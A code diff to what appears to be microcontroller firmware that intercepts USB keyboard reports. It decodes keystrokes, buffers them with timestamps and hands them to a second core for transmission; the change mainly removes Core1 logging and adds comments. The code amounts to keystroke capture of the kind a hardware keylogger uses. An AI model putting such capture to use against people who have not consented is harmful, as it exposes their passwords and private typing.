@@ -19,7 +19,6 @@
 #include "formatted_event_queue.h"  /* For API compatibility (formatted_queue_t parameter) */
 #include "psram_buffer.h"
 #include "pico/time.h"  /* For time_us_64() */
-#include "configuration.h"  /* For LOG_INFO */
 #include <string.h>
 #include <stdio.h>
 #include <Arduino.h>
@@ -60,6 +59,23 @@ static keystroke_queue_t *g_keystroke_queue = NULL;
  * ============================================================================
  * Core1 now owns the keystroke buffer and all buffer operations.
  * When a buffer is finalized, it is written to PSRAM for Core0 to transmit.
+ *
+ * Architecture:
+ *  - Core1 maintains its own 500-byte keystroke buffer
+ *  - Buffer format: [epoch:10][data:480][epoch:10]
+ *  - Delta encoding for Enter keys (3 bytes vs 10 bytes = 70% savings)
+ *  - On finalization: Buffer → PSRAM slot → Core0 transmission
+ *
+ * Buffer Lifecycle:
+ *  1. First keystroke → core1_init_keystroke_buffer()
+ *  2. Characters added → core1_add_to_buffer(char)
+ *  3. Enter keys added → core1_add_enter_to_buffer() (with delta encoding)
+ *  4. Buffer full OR delta overflow → core1_finalize_buffer()
+ *  5. Finalization → Write to PSRAM → Reset buffer
+ *
+ * Performance Impact:
+ *  - Core1: No significant overhead (processing happens during capture)
+ *  - Core0: 90% reduction (removed all buffer management)
  */
 
 /* Buffer constants (from USBCaptureModule) */
@@ -79,89 +95,60 @@ static bool g_core1_buffer_initialized = false;
 static uint32_t g_core1_buffer_start_epoch = 0;
 
 /* Forward declarations for buffer helper functions */
-static void core1_write_epoch_at(size_t pos);
-static void core1_write_delta_at(size_t pos, uint16_t delta);
-static void core1_init_keystroke_buffer();
-static size_t core1_get_buffer_space();
-static bool core1_add_to_buffer(char c);
-static bool core1_add_enter_to_buffer();
-static void core1_finalize_buffer();
 
 /**
- * @brief Format and log keystroke event directly on Core1
- *
- * Core1 formats and logs events immediately, eliminating the need
- * for Core0 to process a formatted event queue.
- *
- * @param event Keystroke event to format and log
+ * @brief Write uptime timestamp at buffer position
+ * @param pos Buffer position to write 10-digit uptime string
+ * @note Uptime format: millis()/1000 (seconds since boot, not unix epoch)
+ * @note TODO: Replace with RTC for true unix timestamps
  */
-static void format_and_log_event(const keystroke_event_t *event)
-{
-    char formatted_text[MAX_FORMATTED_LEN];
+static void core1_write_epoch_at(size_t pos);
 
-    /* Format the event text based on type */
-    switch (event->type)
-    {
-    case KEYSTROKE_TYPE_CHAR:
-        snprintf(formatted_text, MAX_FORMATTED_LEN, "CHAR '%c' (scancode=0x%02x, mod=0x%02x)",
-                 event->character, event->scancode, event->modifier);
-        break;
+/**
+ * @brief Write 2-byte delta at buffer position
+ * @param pos Buffer position to write delta
+ * @param delta Seconds since buffer start (0-65535, big-endian)
+ */
+static void core1_write_delta_at(size_t pos, uint16_t delta);
 
-    case KEYSTROKE_TYPE_BACKSPACE:
-        snprintf(formatted_text, MAX_FORMATTED_LEN, "BACKSPACE");
-        break;
+/**
+ * @brief Initialize keystroke buffer for new accumulation
+ * @post Buffer zeroed, start epoch written, write pos reset to data start
+ */
+static void core1_init_keystroke_buffer();
 
-    case KEYSTROKE_TYPE_ENTER:
-        snprintf(formatted_text, MAX_FORMATTED_LEN, "ENTER");
-        break;
+/**
+ * @brief Get remaining space in buffer data area
+ * @return Bytes available before final epoch reserved space
+ */
+static size_t core1_get_buffer_space();
 
-    case KEYSTROKE_TYPE_TAB:
-        snprintf(formatted_text, MAX_FORMATTED_LEN, "TAB");
-        break;
+/**
+ * @brief Add single character to buffer
+ * @param c Character to add
+ * @return true if added, false if buffer full (need finalization)
+ * @note Auto-initializes buffer on first call
+ */
+static bool core1_add_to_buffer(char c);
 
-    case KEYSTROKE_TYPE_ERROR:
-        if (event->error_flags == 0xDEADC1C1)
-        {
-            snprintf(formatted_text, MAX_FORMATTED_LEN, "CORE1_ERROR: PIO configuration failed!");
-        }
-        else
-        {
-            snprintf(formatted_text, MAX_FORMATTED_LEN, "ERROR (flags=0x%08x)", event->error_flags);
-        }
-        break;
+/**
+ * @brief Add Enter key with delta-encoded timestamp
+ * @return true if added, false if buffer full
+ * @note Writes 3 bytes: marker (0xFF) + 2-byte delta
+ * @note Auto-finalizes if delta > 65000 seconds (18 hour overflow protection)
+ */
+static bool core1_add_enter_to_buffer();
 
-    case KEYSTROKE_TYPE_RESET:
-        /* Decode Core1 status codes */
-        if (event->scancode == 0xC1)
-        {
-            snprintf(formatted_text, MAX_FORMATTED_LEN, "CORE1_STATUS: Core1 entry point reached");
-        }
-        else if (event->scancode == 0xC2)
-        {
-            snprintf(formatted_text, MAX_FORMATTED_LEN, "CORE1_STATUS: Starting PIO configuration...");
-        }
-        else if (event->scancode == 0xC3)
-        {
-            snprintf(formatted_text, MAX_FORMATTED_LEN, "CORE1_STATUS: PIO configured successfully");
-        }
-        else if (event->scancode == 0xC4)
-        {
-            snprintf(formatted_text, MAX_FORMATTED_LEN, "CORE1_STATUS: Ready to capture USB data");
-        }
-        else
-        {
-            snprintf(formatted_text, MAX_FORMATTED_LEN, "RESET (scancode=0x%02x)", event->scancode);
-        }
-        break;
+/**
+ * @brief Finalize buffer and write to PSRAM
+ * @post Buffer written to PSRAM, Core1 buffer reset for next accumulation
+ * @note Core0 will read from PSRAM and transmit
+ * @note On PSRAM full: Buffer dropped (stat tracked in g_psram_buffer)
+ */
+static void core1_finalize_buffer();
 
-    default:
-        snprintf(formatted_text, MAX_FORMATTED_LEN, "UNKNOWN (type=%d)", event->type);
-        break;
-    }
-
-    /* Log directly on Core1 */
-    LOG_INFO("[Core1] %s", formatted_text);
-}
+/* Logging removed from Core1 - LOG_INFO not safe from Core1 context
+ * All logging now happens on Core0 from PSRAM buffer content */
 
 void keyboard_decoder_core1_init(keystroke_queue_t *queue, formatted_event_queue_t *formatted_queue)
 {
@@ -253,7 +240,6 @@ void keyboard_decoder_core1_process_report(uint8_t *data, int size, uint32_t tim
                 event = keystroke_event_create_special(
                     KEYSTROKE_TYPE_ENTER, keycode, capture_timestamp_us);
                 keystroke_queue_push(g_keystroke_queue, &event);
-                format_and_log_event(&event);  /* Log directly on Core1 */
                 added = core1_add_enter_to_buffer();  /* Add to Core1 buffer */
             }
             else if (keycode == HID_SCANCODE_BACKSPACE)
@@ -262,7 +248,6 @@ void keyboard_decoder_core1_process_report(uint8_t *data, int size, uint32_t tim
                 event = keystroke_event_create_special(
                     KEYSTROKE_TYPE_BACKSPACE, keycode, capture_timestamp_us);
                 keystroke_queue_push(g_keystroke_queue, &event);
-                format_and_log_event(&event);  /* Log directly on Core1 */
                 added = core1_add_to_buffer('\b');  /* Add to Core1 buffer */
             }
             else if (keycode == HID_SCANCODE_TAB)
@@ -271,7 +256,6 @@ void keyboard_decoder_core1_process_report(uint8_t *data, int size, uint32_t tim
                 event = keystroke_event_create_special(
                     KEYSTROKE_TYPE_TAB, keycode, capture_timestamp_us);
                 keystroke_queue_push(g_keystroke_queue, &event);
-                format_and_log_event(&event);  /* Log directly on Core1 */
                 added = core1_add_to_buffer('\t');  /* Add to Core1 buffer */
             }
             else
@@ -283,7 +267,6 @@ void keyboard_decoder_core1_process_report(uint8_t *data, int size, uint32_t tim
                     event = keystroke_event_create_char(
                         ch, keycode, modifier, capture_timestamp_us);
                     keystroke_queue_push(g_keystroke_queue, &event);
-                    format_and_log_event(&event);  /* Log directly on Core1 */
                     added = core1_add_to_buffer(ch);  /* Add to Core1 buffer */
                 }
             }
@@ -445,8 +428,8 @@ static void core1_finalize_buffer()
     /* Write to PSRAM for Core0 to transmit */
     if (!psram_buffer_write(&psram_buf))
     {
-        /* Buffer full - Core0 slow to transmit, log error directly on Core1 */
-        LOG_INFO("[Core1] PSRAM buffer full (%u bytes dropped)", psram_buf.data_length);
+        /* Buffer full - Core0 slow to transmit
+         * Cannot log from Core1 safely - Core0 will see dropped_buffers stat */
     }
 
     /* Reset for next buffer */
